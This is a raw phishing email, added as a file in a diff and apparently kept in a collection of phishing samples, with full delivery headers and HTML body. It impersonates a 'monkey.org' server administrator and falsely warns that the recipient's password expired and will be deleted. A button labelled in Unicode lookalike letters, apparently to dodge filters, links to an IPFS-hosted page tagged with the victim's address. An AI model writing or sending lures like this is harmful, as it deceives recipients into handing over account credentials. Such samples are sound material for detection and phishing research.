@@ -1,0 +1,168 @@
+Return-Path: info@exalplast.com
+Delivered-To: jose@monkey.org
+X-FDA: 82010666094.22.FB366F3
+Received: from sxb1plsmtpa01-07.prod.sxb1.secureserver.net
+ (sxb1plsmtpa01-07.prod.sxb1.secureserver.net [188.121.53.73])	by
+ imf17.b.hostedemail.com (Postfix) with ESMTP id F2249140006	for
+ <jose@monkey.org>; Mon, 15 Apr 2024 05:40:25 +0000 (UTC)
+Authentication-Results: imf17.b.hostedemail.com;	dkim=none;	spf=softfail
+ (imf17.b.hostedemail.com: 188.121.53.73 is neither permitted nor denied by
+ domain of info@exalplast.com) smtp.mailfrom=info@exalplast.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1713159626;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=iBA4GClMuTtwzqmr6x96s+f9nfgUUVIubZYys1uutN8=;
+	b=iDfkmkO/cv9gy7U1XbNj9v4CJQyQ6oFBZ40TdSxBOVEbXGBprYz3IifnRKgFa5wy4Pll1Q
+	vkO+RSICZRt48pZVUMlCHjw5qv7n5WW8pHrmXuMVyJ4J46XxB+ZmWS3c+ihfGu/Q9nkVxO
+	FAXq9ZIjqubar1Mj876MiLbo5fqffW8=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1713159626; a=rsa-sha256;
+	cv=none;
+	b=kTnFD8Z73lKMS02HkFfLQi6bH9amEUCSPrZv1eG2pAD02BVoZ1z4638mNZgzDisVE46zw7
+	ZF9yNRIr5tKGu5IyjpHPrYX+SRvZjEIy50vaYuxUYbF0aDDmdKEQEV1vP4aQaO0MQjKEIh
+	er1biyPBW27YwRpvU2pIiUvPHO6j16Q=
+ARC-Authentication-Results: i=1;	imf17.b.hostedemail.com;	dkim=none;
+	spf=softfail (imf17.b.hostedemail.com: 188.121.53.73 is neither permitted nor
+ denied by domain of info@exalplast.com) smtp.mailfrom=info@exalplast.com;
+	dmarc=none
+Received: from exalplast.com ([102.90.64.15])
+	by :SMTPAUTH: with ESMTPSA
+	id wF4GrI3Rr8kvHwF4nrZq5c; Sun, 14 Apr 2024 22:40:22 -0700
+X-SECURESERVER-ACCT: sales@anilkumarco.in
+From: monkey.org - Server Administrator <info@exalplast.com>
+To: jose@monkey.org
+Subject: Server monkey.org - Expired 15 Apr 2024
+Date: 15 Apr 2024 01:40:21 -0400
+Message-ID: <20240415014020.DFD1253FF2AD9F76@exalplast.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-CMAE-Envelope: =?utf-8?q?MS4xfKxtVLXgyG+S/4R1wL2Q4lXHPQkYGVdQ5EWP2EyPHjEOS?=
+ =?utf-8?q?iBTTbPgrnZUnjnVHzFgPa/uJs/CME5BIml4z017z1l65SUPeV0Bkgc19Qlp/nLben?=
+ =?utf-8?q?+ipJiw_XNb3qdk03Dh9HmLWWq02vjp/6RvcMfYobtViSi17y/Y688jeKzuOup5flh?=
+ =?utf-8?q?IEV9QcUUu22coQ0ABZHA=3D=3D?=
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: F2249140006
+X-Stat-Signature: dhzxhzbecxxikqg4x8x36j3ws8875t3m
+X-Rspam-User: 
+X-Spam-Status: No, score=4.70
+X-CMAE-Analysis: v=2.4 cv=ce3UrGDM c=1 sm=1 tr=0 ts=661cbdca
+	a=ihQzeRfjwRPOfp7uBE/9pQ==:117 a=VWll9mCW5NsLIqh2iW91BA==:17
+	a=T-PJXEmqAAAA:8 a=sbqGhzo7vaogXqIfg0wwtJZuoPc=:19 a=raytVjVEu-sA:10
+	a=bNMPW4gmAAAA:8 a=FXSE5VMvvUc-rE58NiMA:9 a=s8XRULAgMrovwj6A:21
+	a=frz4AuCg-hUA:10 a=_W_S_7VecoQA:10 a=lqcHg5cX4UMA:10 a=RVmHIydaz68A:10
+	a=TLMVSm3AIi2ufbynrBM0:22 a=WvVdt3RAwBZJIXNiTN-t:22
+X-HE-Tag: 1713159625-138410
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19izQ9LVFIauD29lJjj9xknCy7GDEau0s34POP5zVlnG3J?=
+ =?utf-8?q?8Sxvhjxhem/vR80c2w+OukMc8nJOv4GMF886FSKg84PPuDHr9jQE4UAX215tozypb?=
+ =?utf-8?q?o7Yn5LfB3XCQV5a9UWFVey/yeZiR8ErNzcHc84cYX9Ovj22E7XeuyCWoFKHJ4/DTX?=
+ =?utf-8?q?B8lI2NKtg3VD/3iRjumsspBlpt04h0jVKm3TY67pJwatUQXCQLTQdnRzLtW0pe1VX?=
+ =?utf-8?q?332TCQUjO8ch+Py+6RWjvv8NjubhPdrqNSdtXq692XY9hinw/w3F3qtuOwqhTZATg?=
+ =?utf-8?q?ih14nRLt/PUPMqU9x0c3XIVpXll3XZlyyBxjn6EBGiKZF/JdrZqdEIbeT5Q9zmkHp?=
+ =?utf-8?q?DPfi/kCicHe4fvhz9KHaMUUPTlwJLNPpNQNl1+7xp9LxTCwb6oU2JM85M9L2bfII4?=
+ =?utf-8?q?n9NH/8NGWfodOEEprUH66Gtz4MsNMFEDxjQUPpNkCZ7H6bEnF1VGWIUqTO9roZj7D?=
+ =?utf-8?q?ECSGpVpgUwcXJWudyV/NIHKtBpBp0lWLxJcJKYLI7RWzOojm0jj6KGswR8PBGsFjS?=
+ =?utf-8?q?xKDQuyD6eNmW03JsRVlSdkp2Z1rB1icbITzdJ9ivBguO/itNCkhXMiETL1mO4ZtPg?=
+ =?utf-8?q?KIhiKvQiCvmMkDUGvdTti3m/QtKxPwcZBMQxaSf7NDL6/mYtAySnB+wt2lCPRRh4n?=
+ =?utf-8?q?ndGshIrlzYDuPkeR49osRKFZJ9SDA/r5XQCJsfrpR+sejqc4U9Q5T8kqcR8FVHKgN?=
+ =?utf-8?q?hSB+qbsXbxwU0TGMKqYRfw9AsICSsoDilsxlPkfJ+hetPPHIKiy4GL8qdQ3n86SZW?=
+ =?utf-8?q?T+vJ7PXVLveY7RWCZXm9Y7yv4yZsjC/qA9M5+RSPYuYu304UDsDI2hP5PzplqM57d?=
+ =?utf-8?q?OjEhNcZ4q9Um1nt17TsSUudB3ujJLxVwXUnxDePN4eaZkm/GodCDoCtIiofLRvaue?=
+ =?utf-8?q?JljaVebOjTWZbtKtIT4U3k?=
+ gdYQ/wq5mGQ6W9jDm0JKTEwd+HWP6N44m4pFxp/LVb+gI7ew=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 103
+
+<html><head>
+<style type=3D"text/css">#editbody1 CITE=20
+
+ {
+ FONT-SIZE: 0}
+}
+#editbody1 .v1BDY {font-family:"wf_segoe-ui_normal","Segoe UI","Segoe WP",T=
+ahoma,Arial,sans-serif;
+ font-size: 16px} #editbody1 .v1AOL {font-family:"wf_segoe-ui_normal","Sego=
+e UI","Segoe WP",Tahoma,Arial,sans-serif;
+ font-size: 14px;
+font-weight: 15;
+COLOR:#0f0000} #editbody1 .v1PUC {MIN-WIDTH: 50px;
+PADDING-BOTTOM: 5px;
+PADDING-TOP: 5px;
+PADDING-LEFT: 20px;
+PADDING-RIGHT: 20px;
+BACKGROUND-COLOR:#0f0000}
+#editbody1 .v1TUI {TEXT-DECORATION: none;
+FONT-FAMILY: "Calibri";
+FONT-WEIGHT: 600;
+COLOR: rgb(255, 255, 255);
+TEXT-ALIGN: center}</style>
+
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div id=3D"editbody1">
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding-bottom: 20px;">
+<div style=3D"margin: 0px auto; padding-right: 20px; padding-left: 20px; ma=
+x-width: 600px;">
+<table align=3D"center" style=3D"margin: 0px auto; width: 100%; color: rgb(=
+17, 17, 17); font-family: sans-serif; max-width: 600px; border-spacing: 0;"=
+>
+<tbody>
+<tr>
+<td style=3D"padding: 0px;">
+<table width=3D"73%" style=3D"color: rgb(17, 17, 17); font-family: sans-ser=
+if; border-spacing: 0;">
+<tbody>
+<tr></tr></tbody></table></td>
+<td style=3D"padding: 0px;">
+<table width=3D"100%" style=3D"color: rgb(17, 17, 17); font-family: sans-se=
+rif; border-spacing: 0;">
+<tbody>
+</tbody></table></td></tr></tbody></table></div></td></tr></tbody></table>
+<div>
+<center>
+<div style=3D"border-radius: 4px; width: 570px; height: 300px; text-align: =
+left; padding-top: 1px; padding-left: 25px; background-color: rgb(255, 255,=
+ 255);">
+<div style=3D"width: 150px; margin-top: 0px; border-bottom-color: rgb(0, 16=
+6, 63); border-bottom-width: 3px; border-bottom-style: solid;"></div><br>
+<p style=3D"margin: 0px; text-align: center; line-height: inherit; font-siz=
+e: 14px; box-sizing: border-box;"><span style=3D"margin: 0px; padding: 0px;=
+ border: 0px currentColor; border-image: none; color: rgb(0, 49, 136); line=
+-height: inherit; font-family: inherit; font-size: 14px; font-style: inheri=
+t; font-variant: inherit; font-weight: inherit; vertical-align: baseline; b=
+ox-sizing: border-box; font-stretch: inherit;"> <strong style=3D"font-weigh=
+t: bolder; box-sizing: border-box;">
+Server monkey.org - Expired 15 Apr 2024 <br style=3D"box-sizing: border-box=
+;">&nbsp;</strong></span></p>
+<p class=3D"v1AOL">The current password for <a href=3D"mailto:jose@monkey.o=
+rg" rel=3D"noreferrer">jose@monkey.org</a> expired today 15 Apr 2024 and wa=
+s marked for automatic&nbsp;deletion.<br><br>If not reconfirmed within the =
+next&nbsp;48 hours, our system will log you out and generate a new password=
+ for you, to avoid this kindly use the button below to reconfirm your accou=
+nt.</p><span style=3D"color: black; font-family: Courier New;">
+<a href=3D"https://bafkreia2wgpwvfclmzg6xll3btfi3xfjmfgyxnb5pvffvogecxe2tya=
+7e4.ipfs.cf-ipfs.com#jose@monkey.org" target=3D"_blank" rel=3D"noopener nor=
+eferrer"><button style=3D"padding: 5px; border-radius: 4px; width: 200px; h=
+eight: 28px; color: rgb(255, 255, 255); font-family: Arial, Helvetica, sans=
+-serif; font-size: 14px; font-weight: bold; margin-top: 20px; background-co=
+lor: rgb(25, 118, 210);">
+C&#7439;&#628;&#1171;&#618;&#640;&#7437; &#7424;&#7428;&#7428;&#7439;&#7452=
+;&#628;&#7451; H&#7431;&#640;&#7431;</button></a><br><br><br><span style=3D=
+"color: silver; font-family: Arial; font-size: xx-small;"><span>
+NOTICE: Once you've completed the confirmation process, your email account =
+will continue to work effectively. If you have any questions or need assist=
+ance during this process, please don't hesitate to reach out to our support=
+ team. We're here to help! Thank you for your attention to this matter, and=
+ we appreciate your continued partnership. Copyright &nbsp;monkey.org&nbsp;=
+ 2024 All rights reserved..</span></span></span></div></center></div></div>=
+</body></html>
+
